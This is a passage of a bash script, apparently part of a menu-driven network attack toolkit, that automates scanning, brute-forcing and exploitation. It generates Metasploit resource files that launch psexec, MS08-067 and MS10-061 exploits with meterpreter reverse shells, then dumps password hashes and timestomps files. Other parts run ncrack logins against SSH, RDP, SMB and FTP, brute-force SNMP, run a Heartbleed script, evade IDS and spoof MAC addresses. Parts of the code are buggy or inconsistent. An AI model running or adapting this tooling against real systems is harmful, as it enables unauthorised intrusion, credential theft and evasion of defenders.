   echo -e "\e[01;36m1)\e[00m Create Payload/Handler"
   echo -e "\e[01;36m2)\e[00m Netapi (XP)"
   echo -e "\e[01;36m3)\e[00m SpoolSS (Print Spooler)"
   echo -e "\e[01;36m4)\e[00m Check Vulns \e[01;31mUnsafe\e[00m - Check For Vulnerabilities Unsafe"
   echo -e "\e[01;36m5)\e[00m Check Vulns \e[01;33mSafe\e[00m   - Check For Vulnerabilities safe"
   echo -e "\e[01;36mq)\e[00m Return to the Network Menu"
   echo
   read -p "$action Choose Option >>> " menu_choice

   case $menu_choice in
   1 ) payload ;;
   2 ) util exploit netapi ;;
   3 ) util exploit netapi ;;
   4 ) util exploit spoolss ;;
   5 ) util nmap Vuln_unsafe ;;
   6 ) util nmap Vuln_safe ;;
   q|Q ) network ;;
   * ) aux_menu ;;
   esac
   $cur_men
   
   $cur_men
}

function exploit() {                                                      # Automated Payloads
   cur_men="exploit"
   info
   echo 
   echo -e "\e[01;36m<<EXPLOIT MENU>>\e[00m"
   echo -e "\e[01;36m1)\e[00m Create Payload/Handler"
   echo -e "\e[01;36m2)\e[00m PSExec (Need Domain Admin Password and Username)"
   echo -e "\e[01;36m3)\e[00m Netapi (XP)"
   echo -e "\e[01;36m4)\e[00m SpoolSS (Print Spooler)"
   echo -e "\e[01;36m5)\e[00m Check Vulns \e[01;31mUnsafe\e[00m - Check For Vulnerabilities Unsafe"
   echo -e "\e[01;36m6)\e[00m Check Vulns \e[01;33mSafe\e[00m   - Check For Vulnerabilities safe"
   echo -e "\e[01;36mq)\e[00m Return to the Network Menu"
   echo
   read -p "$action Choose Option >>> " menu_choice

   case $menu_choice in
   1 ) payload ;;
   2 ) util exploit psexec ;;
   3 ) util exploit netapi ;;
   4 ) util exploit spoolss ;;
   5 ) util nmap Vuln_unsafe ;;
   6 ) util nmap Vuln_safe ;;
   q|Q ) network ;;
   * ) aux_menu ;;
   esac
   $cur_men
}

function payload() {                                                             # Generate AV Bypass Payload
   display action "Creating Payload and Listener"
   action "Payload/Listener" "python $pay_gen" "true" "1200|50|20" &
   sleep 2
   $cur_men
}

function util() {                                                                # NMap Scan Method
#set -x
   mkdir $scan_dir 2>$logfile 
   method=$1
   sub_method=$2
   if [ "$sub_method" != "View" ] ; then
      cur_men="util "$method" $sub_method"
   fi
   info no_clear
   echo ""
   if [ "$method" == "brute" ] ; then
      num_pass="$(wc $passlist | awk '{ print $1 }')"
      display info " Current Passlist - $passlist - $num_pass passwords"         # Displays the current Password List in the menu
   fi
   display info " Scan Selected =  \e[01;32m$method $sub_method\e[00m"
   if [ -e $tmp/targets ] ; then
      read -p "$action Choose Host or (a)ll above - (q)uit >>> " menu_choice
      if [[ "$menu_choice" =~ ^[VvEeHhFfIiRrSsMmCcBb]$ ]] ; then                 # Sends "other" Commands to aux_menu Function
         aux_menu
         $cur_men
      fi
      if [[ "$menu_choice" =~ ^[Qq]$ ]] ; then
         if [ "$method" == "brute" ] ; then
            brute_force
         elif [ "$sub_method" == "SNMP" ] ; then
            snmp                                                                 # Brute Force SNMP
         elif [ "$method" == "rdesktop" ] ; then
            protocol
         else
            nmap_menu                                                            # Return to NMap Menu
         fi
      elif [[ "$menu_choice" =~ ^[Aa]$ ]] && [ "$method" == "brute" ] ; then
         display error "Not a good Choice - Try Again" ; sleep 1 ; $cur_men      # $i Comes From Info Function
      elif [[ "$menu_choice" =~ ^[Aa]$ ]] && [ "$sub_method" == "psexec" ] ; then
         targets="$(grep '135/tcp   open' $tmp/scans/*.nmap | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u)"      # Grabs Only Windows PCs
         echo $targets
      elif [[ "$menu_choice" =~ ^[Aa]$ ]] ; then
         targets="$(cat $tmp/list_$sub)"
      elif [[ "$menu_choice" -gt "$i" ]] ; then 
         display error "Invalid Choice - Try Again" ; sleep 1 ; $cur_men         # $i Comes From Info Function
      elif (( "$menu_choice" <= "$i" )) ; then
         targets="$(cat $tmp/targets | grep -w " $menu_choice " | awk '{ print $3 }')"
      else
         aux_menu
         $cur_men
      fi
      if [ "$method" == "brute" ] ; then
         uname="$(grep -w -A 8 "$targets" $tmp/router_info 2>$logfile | grep "friendlyName: " | cut -d ':' -f3 | awk '{ print $1}' | head -n1)"
      fi
      if [ "$method" == "nmap" ] ; then
         if [ "$sub_method" == "Aggressive" ] ; then                             # Aggressive Scan
            scan="$agg_scan"
            scan_gateway="$agg_router_scan"
         elif [ "$sub_method" == "NSLookup" ] ; then                             # Ping Scan
            scan="$host_scan"
            scan_gateway="$host_disc_scan"
         elif [ "$sub_method" == "Ping" ] ; then                                 # Ping Scan
            scan="$host_disc_scan"
            scan_gateway="$host_disc_scan"
         elif [ "$sub_method" == "Minimal" ] ; then                              # Minimal Scan
            scan="$min_scan"
            scan_gateway="$min_scan"
         elif [ "$sub_method" == "Normal" ] ; then                               # Normal Scan
            scan="$nor_scan"
            scan_gateway="$nor_router_scan"
         elif [ "$sub_method" == "Aggressive_NP" ] ; then                        # Aggressive With No Ping
            scan="$agg_np_scan"
            scan_gateway="$agg_np_router_scan"
         elif [ "$sub_method" == "Normal_NP" ] ; then                            # Normal With No Ping
            scan="$nor_np_scan"
            scan_gateway="$nor_np_router_scan"
         elif [ "$sub_method" == "Slow" ] ; then                                 # The Kitchen Sink
            scan="$slo_scan"
            scan_gateway="$slo_router_scan"
         elif [ "$sub_method" == "Fragmented" ] ; then                           # Fragmented IDS Evasion
            scan="$frag_scan"
            scan_gateway="$frag_scan"                                            # Dont have a scan for router frag yet
         elif [ "$sub_method" == "Vuln_unsafe" ] ; then                          # Check For Vulnerabilities (Not Safe)
            scan="$vuln_unsafe_scan"
            scan_gateway="no"                                                    # Do not want to Vuln Scan the Router
         elif [ "$sub_method" == "Vuln_safe" ] ; then                            # Check For Vulnerabilities (Safe)
            scan="$vuln_safe_scan"
            scan_gateway="no"                                                    # Do not want to Vuln Scan the Router
         elif [ "$sub_method" == "View" ] ; then                                 # Open Nmap Scan With Gedit
            for n in $targets ; do 
               if [ -e $scan_dir/$n.nmap ] ; then 
                  gedit $scan_dir/$n.nmap &
               else
		            display error "NMap Report Not Found"
                  sleep 1
               fi
            done
            info yes $n                                                          # YES has to do with parsing data
            $cur_men
         fi
         y="100"
         for n in $targets ; do
            if [ "$sub_method" != "Ping" ] && [ ! -e "$tmp/scans/ns_$n" ] ; then
               $host_scan $n | grep name | awk '{ print $5 }' | cut -d "." -f1 > $tmp/ns_$n           # runs the Ping Sweep Scan
            fi
            if [ "$n" == "$gateway" ] && [ "$scan_gateway" != "no" ] ; then
               command="nmap -e $interface --open $scan_gateway --append-output -oA $scan_dir/$n $n"  # Scans the Gateway device
            elif [ "$n" != "$gateway" ] && [ "$scan_gateway" != "no" ] ; then
               command="nmap -e $interface --open $scan --append-output -oA $scan_dir/$n $n"          # Scans Non-gateway devices
            fi
            if [ "$sub_method" != "NSLookup" ] ; then                                                 # NSLookup
               xterm -geometry 87x20+1200+$y -T "Scan "$sub_method" : $n" -e "$command -vv" &
            fi
            echo "Scan_level = $sub_method" >> $scan_dir/$n.nmap                                      # Adds information to the NMap scan output
            y=$(($y+40))
         done
      fi
#__ Connecting With RDP ___________________________________________________________________________
      if [ "$method" == "rdesktop" ] ; then
         #resolution="$(xrandr | grep " connected " |  awk '{print $3}' | awk -F '+' '{print $1}' | grep x | head -n 1)"
         if [ "$domain" != "" ] ; then
            action "$targets Remote Desktop" "rdesktop -d $domain -u administrator -g $resolution -X l $targets:3389" "true" &    # Connects to Remote Desktop with the Domain added
         else
            action "$targets Remote Desktop" "rdesktop -u administrator -g $resolution -X l $targets:3389" "true" &               # Connects to Remote Desktop without the Domain added
         fi
         $cur_men
      fi 
#__ HeartBleed ____________________________________________________________________________________
      if [ "$method" == "Heartbleed" ] ; then
         read -p "$action Input Port # (Comma Seperated) -enter- to use (443) >>> " hb_port
         if [ ! -z $hb_port ] ;then
            hb_port="-p $hb_port"
         fi
         for n in $targets ; do
                  cd $wd
                  action "$n - Heart Bleed Vulnerability" "python $(pwd)/misc/heartbleed.py $n > $tmp/scans/hb-$n" "false"                                                   # Run HeartBleed Code            
         done
         $cur_men
      fi
      if [ "$method" == "misc" ] ; then                                          # Misc - SNMP UPnP (eventually) and other odd protocols
#__ SNMP __________________________________________________________________________________________
         if [ "$sub_method" == "SNMP" ] ; then
            for n in $targets ; do
               action "$n - SNMP Community String Brute Force" "nmap -sU -p161 --script snmp-brute $n | grep Valid > $tmp/c_string-$n" "false"
               c_string="$(cat $tmp/c_string-$n | awk '{ print $2 }' | head -n 1)"
               if [ "$c_string" == "" ] || [ "$c_string" == "public" ] ; then
                  c_string="public"
               fi
               action "Getting SNMP Info for $n" "snmpwalk -v 1 -c $c_string $n > $scan_dir/snmp_info-$n" "false" &                # Test for enumeration
               if [ "$RETVAL" == "1" ] ; then
                  action "Getting SNMP Info for $n" "snmpwalk -v 2c -c $c_string $n >> $scan_dir/snmp_info-$n" "false" &           # Test for enumeration
               fi
            done
         fi
#__ WMI ___________________________________________________________________________________________
         if [ "$sub_method" == "WMI_E" ] ; then                                  # wmi Emumeration tool
            read -p "$action Input Domain Username -enter- to use (administrator)>>> " dom_usr
            if [ "$dom_usr" == "" ] ; then
               dom_usr="administrator"
            fi
            display info "Using Domain User - $dom_usr"
               read -p "$action Input Domain Password -enter- to use>>> " dom_pass
            if [ "$dom_pass" == "" ] ; then
               dom_pass=""
            fi
            display info "Using Domain Password - $dom_pass"
            read -p "$action Enter Domain Name -enter- to use ($workgroup)>>> " domain
            if [ "$domain" == "" ] ; then
               domain="$workgroup"
            fi
            display info "Using Domain - $domain"
            for n in $targets ; do
               if [ "$domain" != "" ] ; then
                  mkdir /tmp/menu/debug
                  action "$n - WMI Enmumeration" "$wmic_path --workgroup=\"$domain\" --user=\"$dom_usr\" --password=\"$dom_pass\" //$n \"select * from Win32_ComputerSystem\"  > $scan_dir/WMI_E-$n" "false"                                                                                        # If enumerating a Domain machine
               else
                  command="$wmic_path --user=\"$dom_usr\" --password=\"$dom_pass\" //$n \"select * from Win32_ComputerSystem\"  > $scan_dir/WMI_E-$n"
                  echo "$command" >> /tmp/menu/debug/wmi
                  action "$n - WMI Enmumeration" "$command" "false"                                                                  # If enumerating local admin
               fi
            done
         fi
         $cur_men
      fi
#__ PSEXEC ________________________________________________________________________________________
#set -x
      if [ "$method" == "exploit" ] ; then                                          # Exploits
         mkdir $tmp/msf 2>$logfile
         touch $tmp/msf/post.rc                                                     # Create post.rc for MSF - Used For All Modules
         echo "run migrate -n wininit.exe
               hashdump
               timestomp -r %temp% "03/06/2015 23:26:35"
               sysinfo" > $tmp/msf/post.rc
         if [ "$sub_method" == "psexec" ] ; then

            read -p "$action Input Domain Username -enter- to use (administrator)>>> " dom_usr
            if [ "$dom_usr" == "" ] ; then
               dom_usr="administrator"
            fi
            display info "Using Domain User - $dom_usr"
               read -p "$action Input Domain Password -enter- to use>>> " dom_pass
            if [ "$dom_pass" == "" ] ; then
               dom_pass=""
            fi
            display info "Using Domain Password - $dom_pass"
            read -p "$action Enter Domain Name -enter- to use ($workgroup)>>> " domain
            if [ "$domain" == "" ] ; then
               domain="$workgroup"
            fi
            display info "Using Domain - $domain"
            lport=4567
            for n in $targets ; do
               touch $tmp/msf/$n.rc
               echo "use exploit/windows/smb/psexec
                     set RHOST $n
                     set PAYLOAD windows/meterpreter/reverse_https
                     set SMBUser $dom_usr
                     set SMBPass $dom_pass
                     set SMBDomain $domain
                     set LHOST $lan_ip
                     set LPORT $lport
                     set AutoRunScript multi_console_command -rc $tmp/msf/post.rc
                     exploit" > $tmp/msf/$n.rc
               action "Attempting $sub_method Exploit on $n" "msfconsole -r $tmp/msf/$n.rc" "true" &                # Run MSF PSExec Module
               lport=$(($lport+1))
            done
         fi
         if [ "$sub_method" == "netapi" ] ; then
            echo "use exploit/windows/smb/ms08_067_netapi
                  set RHOST $targets
                  set PAYLOAD windows/meterpreter/reverse_tcp
                  set LHOST $lan_ip
                  set LPORT 4444
                  set AutoRunScript multi_console_command -rc $(pwd)/post.rc
                  exploit" > $tmp/psexec.rc
            action "Attempting $sub_method Exploit on $n" "msfconsole -r $tmp/$n.rc" "true" &                # Run MSF Netapi Module
         fi
         if [ "$sub_method" == "spoolss" ] ; then
            echo "use exploit/windows/smb/ms10_061_spoolss
                  set RHOST $targets
                  set PAYLOAD windows/meterpreter/reverse_tcp
                  set LHOST $lan_ip
                  set LPORT 4445
                  set AutoRunScript multi_console_command -rc $(pwd)/post.rc
                  exploit" > $tmp/spool.rc
            action "Attempting $sub_method Exploit on $n" "msfconsole -r $tmp/spool.rc" "true" &                # Run MSF SpoolSS Module
         fi
         exploit
#__ Netapi ________________________________________________________________________________________
      fi
      if [ "$method" == "brute" ] ; then
         if [ "$sub_method" == "smb" ] ; then
            if [ "$uname" == "" ] ; then
               uname="administrator"
            fi
            port="445"
         elif [ "$sub_method" == "rdp" ] ; then
            if [ "$uname" == "" ] ; then
               uname="administrator"
            fi
            port="3389"
         elif [ "$sub_method" == "telnet" ] ; then
            if [ "$uname" == "" ] ; then
               uname="administrator"
            fi
            port="23"
         elif [ "$sub_method" == "ssh" ] ; then
            if [ "$uname" == "" ] ; then
               uname="administrator"
            fi
            port="22"
         elif [ "$sub_method" == "ftp" ] ; then
            if [ "$uname" == "" ] ; then
               uname="administrator"
            fi
            port="21"
         elif [ "$sub_method" == "http" ] ; then
            if [ "$uname" == "" ] ; then
               uname="admin"
            fi
            port="80"
         elif [ "$sub_method" == "https" ] ; then
            if [ "$uname" == "" ] ; then
               uname="admin"
            fi
            port="443"
         fi
            for n in $targets ; do
               read -p "$action Input Username -enter- to use ($uname) >>> "
               if [ "$REPLY" != "" ] ; then
                  uname="$REPLY"
               fi
               if [ "$sub_method" == "ssh" ] ; then
                  action "$sub_method Brute - $targets" "ncrack -f --user $uname -P $passlist --append-output --oN $tmp/$targets-brute -vv $targets:$port" "true" &
               else
                  action "$sub_method Brute - $targets" "ncrack -f --user $uname -P $passlist --append-output --oN $tmp/$targets-brute -vv $targets:$port" "true" &
               fi
            done
      fi
   else
      cur_men="util "$method" $sub_method"
      netdiscover 1
   fi
set +x
   $cur_men
}
#__ Clear Hosts _________________________________________________________________________________
function clear_targets() {
   rm -rf $tmp/* 2>$logfile
      item="device_info wan_ip router_name router_number wifi_key essid user passwords scan_level alive device_type device_type1 device_type2 device_type3 device_type4 device_type5 workgroup workgroup1 workgroup2 workgroup3 host_name host_name1 host_name2 host_name3 host_name4 host_name5 computer_name computer_name1 computer_name2 computer_name3 computer_name4 computer_name5 model_name model_name1 model_name2 model_name3 model_name4 model_number manufacturer os os1 os2 os3 open_ports macaddress user_name user_name1 user_name2 user_name3"
      for m in ${item[@]} ; do
         eval "$m"=""
      done
   mkdir $tmp
   ident
   main_menu
}

#__ NMap Menu _____________________________________________________________________________________
function nmap_menu() {                                                    # Attach to Network with DHCP
   cur_men="nmap_menu"
   info
   echo
   echo -e "\e[01;36m<<NMAP MENU>>\e[00m"
   echo -e "\e[01;36m1)\e[00m Ping NSLookup      - Get DNS info"
   echo -e "\e[01;36m2)\e[00m Ping Hosts         - Ping Host Only"
   echo -e "\e[01;36m3)\e[00m NMap Minimal       - No Ping / Only Scan (8080,80.443,22,23)"
   echo -e "\e[01;36m4)\e[00m NMap Normal        - With Ping"
   echo -e "\e[01;36m5)\e[00m NMap Aggressive    - With Ping"
   echo -e "\e[01;36m6)\e[00m NMap Normal        - No Ping (-Pn)"
   echo -e "\e[01;36m7)\e[00m NMap Aggressive    - No Ping (-Pn)"
   echo -e "\e[01;36m8)\e[00m NMap Everything    - Slow / Comprehensive"
   echo -e "\e[01;36m9)\e[00m NMap Fragemented   - Fragmented / IDS Evasion"
   echo -e "\e[01;36m0)\e[00m Full Audit"
   echo -e "\e[01;36mv)\e[00m View Scan Results"
   echo -e "\e[01;36mq)\e[00m Return to the Network Menu"
   echo
   read -p "$action Choose Option >>> " menu_choice

   case $menu_choice in
   1 ) util nmap NSLookup ;;
   2 ) util nmap Ping ;;
   3 ) util nmap Minimal ;;
   4 ) util nmap Normal ;;
   5 ) util nmap Aggressive ;;
   6 ) util nmap Normal_NP ;;
   7 ) util nmap Aggressive_NP ;;
   8 ) util nmap Slow ;;
   9 ) util nmap Fragmented ;;
   0 ) full_audit ;;
   q|Q ) network ;;
   * ) aux_menu ;;
   esac
   $cur_men
}

#__ BRUTE FORCE MENU ______________________________________________________________________________
function brute_force() {
   cur_men="brute_force"
   info
   echo
   echo -e "\e[01;36m<<BRUTE FORCE MENU>>\e[00m"
   echo -e "\e[01;36m1)\e[00m http   - 80"
   echo -e "\e[01;36m2)\e[00m https  - 443"
   echo -e "\e[01;36m3)\e[00m SMB    - 445"
   echo -e "\e[01;36m4)\e[00m RDP    - 3389"
   echo -e "\e[01;36m5)\e[00m Telnet - 23"
   echo -e "\e[01;36m6)\e[00m SSH    - 22"
   echo -e "\e[01;36m7)\e[00m FTP    - 21"
   echo -e "\e[01;36mQ)\e[00m Return to the  Network Menu"
   echo
   num_pass="$(wc $passlist | awk '{ print $1 }')"
   display info " Current Passlist - $passlist - $num_pass passwords"         # Displays the current Password List in the menu
   read -p "$action Choose Option >>> " menu_choice

   case $menu_choice in
   1 ) util brute http ;;
   2 ) util brute https ;;
   3 ) util brute smb ;;
   4 ) util brute rdp ;;
   5 ) util brute telnet ;;
   6 ) util brute ssh ;;
   7 ) util brute ftp ;;
   q|Q ) network ;;
   * ) aux_menu ;;
   esac
   $cur_men
}

#__ ROUTER CRACKING _______________________________________________________________________________
function router_scan() {
   $(pwd)/router/router.sh $gateway $interface
}

function router_exploit() {
   if [ -e $exploit_file ] ; then
      $exploit_file $gateway $interface $model &&
      router
   fi
}

function router_brute() {
if [ -e $(pwd)/router/brute/hydra/$model ] ; then
   $brute_hydra "$gateway" "$interface" "$model_name" "$router_number" &&
   router
fi
}

function router_imacros() {
   $brute_imacros "$gateway" "$interface" "$router_name" "$router_number" &&
# router_found=$(cat $tmp/router_pass)
   router
}

function sub_man() {
   read -p "$action Enter Additional Subnet >>> " sub
   echo $sub >> $tmp/subnets1
   $cur_men
}

function router_crack() {
   model=""
   cur_men="router_crack"                                        # Interface to Scan With NMap
   exploit_file="$(egrep "($router_name|$router_number)" $router_exploit_path/* | cut -d ':' -f1 | grep -v \~ | head -n1 | sort -u)"
   brute_hydra="$(egrep "($router_name|$router_number)" $hydra_module_path/* | cut -d ':' -f1 | grep -v \~ | head -n1 | sort -u)"
   brute_imacros="$(egrep "($router_name|$router_number)" $imacros_module_path/* | cut -d ':' -f1 | grep -v \~ | head -n1 | sort -u)"

   avail=""
   if [ -e "$exploit_file" ] ; then 
      exploit_method="Exploit        Module For  $router_name - \e[01;32m[>] Found\e[00m" ;     
   else 
      exploit_method="Exploit        Module For  $router_name - \e[01;31m[!] Not Found\e[00m"
   fi
   if [ -e "$brute_hydra" ] ; then 
      hydra_method="Hydra Brute    Module For  $router_name - \e[01;32m[>] Found\e[00m" ;       
   else 
      hydra_method="Hydra Brute    Module For  $router_name - \e[01;31m[!] Not Found\e[00m"
   fi
   if [ -e "$brute_imacros" ] ; then 
      imacros_method="IMacros Brute  Module For  $router_name - \e[01;32m[>] Found\e[00m" ; 
   else 
      imacros_method="IMacros        Module For  $router_name - \e[01;31m[!] Not Found\e[00m"
   fi
   # Router Brute Menu
   info
   echo
   echo -e "\e[01;36m<<ROUTER MENU>>\e[00m"
   echo -e "\e[01;36m1)\e[00m $exploit_method"
   echo -e "\e[01;36m2)\e[00m $hydra_method"
   echo -e "\e[01;36m3)\e[00m $imacros_method"
   echo -e "\e[01;36mQ)\e[00m Return to the  Network Menu"
   echo
   read -p "$action Choose Option >>> " menu_choice

   case $menu_choice in
   1 ) router_exploit ;;
   2 ) router_brute ;;
   3 ) router_imacros ;;
   q|Q ) network ;;
   * ) aux_menu ;;
   esac
   # sleep 2
   $cur_men
}

function router_page() {
   firefox $gateway
}

#__ Router Menu ___________________________________________________________________________________
function router() {                                                       # Router Attack Menu
   cur_men="router"
   info
   echo
   echo 
   echo -e "\e[01;36m<<ROUTER MENU>>\e[00m"
   echo -e "\e[01;36m1)\e[00m Scan Router"
   echo -e "\e[01;36m2)\e[00m Brute Force / Exploit"
   echo -e "\e[01;36m3)\e[00m Open Router Web Page"
   echo -e "\e[01;36mQ)\e[00m Return to the Network Menu"
   echo
   read -p "$action Choose Option >>> " menu_choice

   case $menu_choice in
   1 ) router_scan ;;
   2 ) router_crack ;;
   3 ) router_page ;;
   q|Q ) network ;;
   * ) aux_menu ;;
   esac
   $cur_men
}

#__ UPnP __________________________________________________________________________________________
function upnp() {
   batch_num="$(wc -l $tmp/list_$sub | awk '{ print $1 }')"                  # Creates a Batch File For Use With Miranda
   echo "msearch" > $tmp/batch
   i="0" 
   while [ $i -le "$batch_num" ] ;
   do
      echo "host get $i" >> $tmp/batch
      echo "host summary $i" >> $tmp/batch
      i=$[$i+1]
   done
   echo "quit" >> $tmp/batch
   action "Miranda UPnP" "cd $(pwd)/misc/upnp/miranda-1.2/src && python miranda.py -b $tmp/batch" "false" &
   router_found="1"
   $cur_men
}

#__ SNMP __________________________________________________________________________________________
function snmpcisco() {
   cd $wd
   action "Cisco - SNMP" "$(pwd)/router/cisco_snmp.sh" "true" "0|0|50" &
   $cur_men
}

function snmp() {
cur_men="snmp"
info
echo
echo -e "\e[01;36m<<SNMP MENU>>\e[00m"
echo -e "\e[01;36m1)\e[00m SNMP Gather (Brute and Walk)"
echo -e "\e[01;36m2)\e[00m Cisco SNMP Vuln"
echo -e "\e[01;36m3)\e[00m The Most Amazing Attack?"
echo -e "\e[01;36mQ)\e[00m Return to the Protocol Menu"
echo
command="$(display action)"
read -p "$action Choose Option >>> " menu_choice

case $menu_choice in
1 ) util misc SNMP ;;
2 ) $"snmpcisco" ;;
3 ) echo "Coming Soon" ;;
q|Q ) protocol ;;
* ) aux_menu ;;
esac
$cur_men
}

#__ SIDEJACKING ___________________________________________________________________________________
function sidejacking() {                                                  # Sidejacking Utility
echo "Sidejacking not yet available"
$cur_men
}
function passwords() {                                                    # Wordlist Manipulator
action "Wordlist utility" "$(pwd)/wordlist/word_menu.sh" "true" &
$cur_men
}

#__ NETDISCOVER ___________________________________________________________________________________
function netdiscover() {                                                  # NMap Ping Sweep
   sub="$(cat $tmp/cur_subnet)"
   if [ "$1" == switch ] ; then                                                             # For selecting subnet to focus on
      rm -rf $tmp/subs
      subs="$(cat $tmp/subnets)"
      clear
      banner
      targeting="$(cat $tmp/targeting)"
      $border
      printf "# \e[01;32m%-38s\e[00m \e[01;36mSWITCH SUBNETS\e[00m                                  \e[01;33m[press (s)can Hosts]\e[00m           #\n" "$targeting"
      $border
      i="0"
         echo -e "\e[01;36mNum  | Subnetwork\e[00m"
      for s in $subs ; do
         i=$(($i+1))
         echo -e "\e[01;36m-----|-------------------\e[00m" >> $tmp/subs
         printf "%-4s \e[01;36m|\e[00m %-17s\n" "$i" "$s" >> $tmp/subs
      done
      cat $tmp/subs
      echo
      $border
      read -p "$action Select Subnet to Target >>> " sub
      if [[ "$iface" =~ ^[Qq]$ ]] ; then $cur_men ; fi
#   aux_menu
      cat $tmp/subs | grep -w "$sub  " | awk '{ print $3 }' | cut -d "." -f1-3 > $tmp/cur_subnet
      sub="$(cat $tmp/cur_subnet)"
      cat $tmp/list_$sub > $tmp/list
      cat $tmp/ping_$sub > $tmp/ping
      info
      $cur_men
   fi
   
   if [ "$do_sub_scan" == "yes" ] ; then
      if [ ! -f "$tmp/do_sub_scan" ] ; then
         xterm -hold -e "nmap -oN $tmp/subnet_scan -T3 -sP -sn -n --stats-every 10s -iL /root/Desktop/tools/enumeration/subnet_list" &
         echo "1" > $tmp/sub_scan_done
      fi
   fi
   if [ "$cidr" -lt "23" ] ; then
      read -p "$action Large Subnet found -Enter- to Run normal Sweep or Just (l)ocal Subnet - (q)uit >>> "
      if [[ "$REPLY" =~ ^[Qq]$ ]] ; then
         if [ "$1" == "1" ] ; then
            nmap_menu
         else
            info && $cur_men
         fi
      elif [[ "$REPLY" =~ ^[Ll]$ ]] ; then
         cidr="23"
      fi
   fi
   read -p "$action -Enter- to Run Ping Sweep - (q)uit >>> "
   if [[ "$REPLY" =~ ^[Qq]$ ]] ; then
      if [ "$1" == "1" ] ; then        # 1 tells it to not refresh the details
         nmap_menu
      else
         info && $cur_men
      fi
   fi
#   if [ "$interface" != "at0" ] ; then                                                  # Don't want to Dig a fake access point
#      dig | grep -E '(^192\.168|^10\.|^172\.1[6-9]|^172\.2[0-9]|^172\.3[0-1])' | sort -u | grep -vE '(.255$|0$)' >> $tmp/list1_$sub
#   fi
   if [ "$sub" == "" ] ; then
      echo $gateway | cut -d "." -f1-3 > $tmp/cur_subnet
      display error "No Subnet chosen"
   else
         action "Scanning $sub.1/$cidr" "nmap -e $interface $sub.1/$cidr $ping_sweep_scan --append-output -o $tmp/ping_$sub" "false"   
   fi
   if [ -e $tmp/ping_$sub ] ; then
      #if [ "$hide_ext_ips" == "yes" ] ; then
      #   grep -v initiated $tmp/ping_$sub | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -E '(^127\.0\.0\.1|^192\.|^10\.|^172\.1[6-9]|^172\.2[0-9]|^172\.3[0-1])' | sort -u >> $tmp/list1_$sub
      #else
         grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' $tmp/ping_$sub | sort -u >> $tmp/list1_$sub
      #fi
   fi

   #cat $tmp/scans/* | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -E '(^192\.|^10\.[]|^172\.1[6-9]|^172\.2[0-9]|^172\.3[0-1])' | sort -u | grep -vE '(.255$|0$)' >> $tmp/list1_$sub
#   cat $tmp/list1_$sub | grep -E '(^127\.0\.0\.1|^192\.|^10\.|^172\.1[6-9]|^172\.2[0-9]|^172\.3[0-1])' | grep $sub | sort -t. -n -k 4 -u > $tmp/list_$sub
   cat $tmp/list1_$sub | grep $sub | sort -t. -n -k 4 -u > $tmp/list_$sub
#   cat $tmp/list_$sub > $tmp/list
#   cat $tmp/ping_$sub > $tmp/ping
   ident
   if [ "$1" != "all" ] ; then                                                          # So it returns to the All Function where it left off
      $cur_men
   fi
}

#__ Random MAC Address ____________________________________________________________________________
function change_ident() {
rm $tmp/iface
clear
banner
$border
echo -e "#                                       \e[01;36mCHOOSE INTERFACE\e[00m                                                              #"
$border
command="$(display error)"
   iface="$(ifconfig | grep Link | awk '{ print $1 }')"
   i="0"
      echo -e "\e[01;36mNum  | Interface\e[00m"
   for s in $iface ; do
      i=$(($i+1))
      echo -e "\e[01;36m-----|-------------------\e[00m" >> $tmp/iface
      printf "%-4s \e[01;36m|\e[00m %-17s\n" "$i" "$s" >> $tmp/iface
   done
   cat $tmp/iface
   $border
   read -p "$action Enter Interface for Changing - (q)uit >>> " iface
   if [[ "$iface" =~ ^[Qq]$ ]] ; then $cur_men ; fi
   iface="$(cat $tmp/iface | grep -w "$iface  " | awk '{ print $3 }')"
   if [ "$interface" == "$iface"  ] ; then
      read -p "$action This Will Disconnect Your Current Connection (y)es (n)o >>> " choice
      if [[ "$choice" =~ ^[Yy]$ ]] ; then 
         hostname dpt32
         ifconfig $iface down
         macchanger -r $iface
         ifconfig $iface up
         /etc/init.d/network-manager restart
         $cur_men
      else
         $cur_men
      fi
   else
      ifconfig $iface down
      hn="$(shuf -n 1 $(pwd)/misc/hostname.lst)"                        # Shuffles the hostname from file
      hostname $hn
      macchanger -r $iface
      ifconfig $iface up
      ident="true"
      $cur_men
   fi
}

#__ Connect to RDesktop ___________________________________________________________________________
function rdesktop {
   z="$(cat /tmp/menu/creds | grep  | awk '{ print $1 }')"
   cur_men="rdesktop"
   info no_clear
   echo ""
   display info " Connect to Host With Remote Desktop"
   read -p "$action Choose Host - (q)uit >>> " menu_choice
   aux_menu
   
   action "Remote Desktop" "rdesktop -u $usr -p $pwd -g 1680x980 -X l $host:3389" "false" &
}

#__ WMI Enumeration _______________________________________________________________________________
function wmi {
   cur_men="wmi"
   info
   echo
   echo -e "\e[01;36m<<WMI CONTROLS>>\e[00m"
   echo -e "\e[01;36m1)\e[00m Enumerate"
   echo -e "\e[01;36m2)\e[00m Control"
   echo -e "\e[01;36mQ)\e[00m Return to the Protocol Menu"
   echo
   read -p "$action Choose Option >>> " menu_choice

   case $menu_choice in
   1 ) util misc WMI_E ;;
   2 ) util misc WMI_E ;;
   3 )  ;;
   4 ) util rdesktop ;;
   5 ) util Heartbleed ;;
   6 ) action "VLAN Hopper" "$vlan_hopper_path" "false" & ;;
   q|Q ) info no && protocol ;;
   * ) aux_menu ;;
   esac
   $cur_men
}

#__ Protocol Attacks ______________________________________________________________________________
function protocol {                                                        # Network Menu
   cur_men="protocol"
   info
   echo
   echo -e "\e[01;36m<<PROTOCOL CONNECTIONS>>\e[00m"
   echo -e "\e[01;36m1)\e[00m UPnP"
   echo -e "\e[01;36m2)\e[00m SNMP"
   echo -e "\e[01;36m3)\e[00m WMI"
   echo -e "\e[01;36m4)\e[00m RDP (Remote Desktop Protocol)"
   echo -e "\e[01;36m5)\e[00m Heart Bleed Vulnerability"
   echo -e "\e[01;36m6)\e[00m VLAN Hopper"
   echo -e "\e[01;36mQ)\e[00m Return to the Network Menu"
   echo
   read -p "$action Choose Option >>> " menu_choice

   case $menu_choice in
   1 ) upnp ;;
   2 ) snmp ;;
   3 ) wmi ;;
   4 ) util rdesktop ;;
   5 ) util Heartbleed ;;
   6 ) action "VLAN Hopper" "$vlan_hopper_path" "false" & ;;
   q|Q ) info no && network ;;
   * ) aux_menu ;;
   esac
   $cur_men
}

